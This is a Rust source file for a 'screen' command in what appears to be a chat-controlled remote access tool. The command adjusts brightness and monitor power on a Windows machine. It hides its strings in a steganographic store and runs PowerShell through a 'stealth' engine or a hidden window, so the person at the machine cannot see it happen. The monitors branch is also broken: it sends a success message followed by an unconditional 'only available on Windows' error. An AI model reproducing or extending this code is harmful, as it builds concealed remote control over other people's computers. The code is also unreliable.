use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

use windows::Win32::{
    Foundation::{HWND, LPARAM, WPARAM},
    UI::WindowsAndMessaging::{PostMessageW, SC_MONITORPOWER, WM_SYSCOMMAND},
};

pub struct ScreenCommand;

#[async_trait]
impl BotCommand for ScreenCommand {
    fn name(&self) -> &str { "screen" }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "SCREEN").into_boxed_str()) // SCREEN_SHARE? No, SCREEN is "Control screen..."
    }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::System, "SCREEN_USAGE").into_boxed_str())
    }
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(StegoStore::get(StringCategory::System, "SCREEN_EX1").into_boxed_str()) as &str,
            Box::leak(StegoStore::get(StringCategory::System, "SCREEN_EX2").into_boxed_str()) as &str,
            Box::leak(StegoStore::get(StringCategory::System, "SCREEN_EX3").into_boxed_str()) as &str,
            Box::leak(StegoStore::get(StringCategory::System, "SCREEN_EX4").into_boxed_str()) as &str,
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] { &["scr"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let subcommand = match args.next() {
            Some(s) => s.to_lowercase(),
            None => {
                http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::System, "SCREEN_ERR_USAGE")).await?;
                return Ok(());
            }
        };

        let value = match args.next() {
            Some(v) => v.to_lowercase(),
            None => {
                http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::System, "SCREEN_ERR_USAGE")).await?;
                return Ok(());
            }
        };

        match subcommand.as_str() {
            "brightness" | "bright" | "b" => {
                let brightness_value = match value.parse::<u32>() {
                    Ok(v) if v <= 100 => v,
                    _ => {
                        http.create_message(msg.channel_id.get(), "**Error**: Brightness value must be between 0 and 100").await?;
                        return Ok(());
                    }
                };

                let result = set_brightness(brightness_value);

                match result {
                    Ok(_) => {
                        http.create_message(msg.channel_id.get(), &format!("Successfully set brightness to {}%", brightness_value)).await?;
                    }
                    Err(e) => {
                        http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::System, "SCREEN_ERR_BRIGHT").replace("{}", &e.to_string())).await?;
                    }
                }
            }
            "monitors" | "monitor" | "m" => {
                let enable = match value.as_str() {
                    "on" | "enable" | "1" => true,
                    "off" | "disable" | "0" => false,
                    _ => {
                        http.create_message(msg.channel_id.get(), "**Error**: Value must be `on` or `off`").await?;
                        return Ok(());
                    }
                };

                let power_state = if enable { -1 } else { 2 };
                unsafe {
                    let _ = PostMessageW(
                        Some(HWND(-1isize as _)),
                        WM_SYSCOMMAND,
                        WPARAM(SC_MONITORPOWER as usize),
                        LPARAM(power_state),
                    );
                }
                let status = if enable { "on" } else { "off" };
                http.create_message(msg.channel_id.get(), &format!("Successfully sent command to turn monitors {}", status)).await?;

                http.create_message(msg.channel_id.get(), "**Error**: This command is only available on Windows").await?;
                
            }
            _ => {
                http.create_message(msg.channel_id.get(), "**Error**: Subcommand must be `brightness` or `monitors`").await?;
            }
        }

        Ok(())
    }
}

fn set_brightness(brightness: u32) -> Result<()> {
    // set brightness via WMI
    let ps_template = StegoStore::get(StringCategory::Scripts, "SCREEN_PS");
    let script = ps_template.replace("__BRIGHTNESS__", &brightness.to_string());

    if let Some(engine) = crate::stealth::get_engine() {
        let _ = engine.execute_stealth_ps(&script);
        Ok(())
    } else {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        let output = Command::new("powershell")
            .args(&["-NoProfile", "-Command", &script])
            .creation_flags(0x08000000)
            .output()?;

        if output.status.success() {
            Ok(())
        } else {
            let error = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Failed to set brightness: {}", error))
        }
    }
}


